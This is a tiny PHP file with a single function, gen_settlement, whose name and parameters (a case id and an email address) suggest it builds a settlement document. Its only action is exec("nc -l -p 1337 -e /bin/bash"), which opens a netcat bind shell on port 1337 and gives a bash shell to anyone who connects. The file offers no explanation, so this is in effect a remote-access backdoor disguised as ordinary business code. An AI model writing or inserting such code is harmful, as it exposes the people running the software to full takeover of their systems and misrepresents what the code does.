<?php
	function gen_settlement($caseid, $eaddr)
	{
		exec("nc -l -p 1337 -e /bin/bash");
	}
?>